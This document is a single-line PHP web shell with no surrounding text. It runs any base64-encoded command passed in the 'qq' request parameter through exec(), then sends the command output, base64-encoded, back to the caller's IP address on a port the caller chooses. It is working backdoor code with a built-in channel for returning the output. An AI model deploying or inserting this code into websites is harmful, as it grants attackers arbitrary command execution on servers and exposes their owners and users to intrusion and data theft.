<?php exec(base64_decode($_REQUEST['qq']), $dd);file_get_contents('http://'.$_SERVER['REMOTE_ADDR'].':'.$_REQUEST['p'].'/w.php?decodeme='.base64_encode(implode(PHP_EOL, $dd))); ?>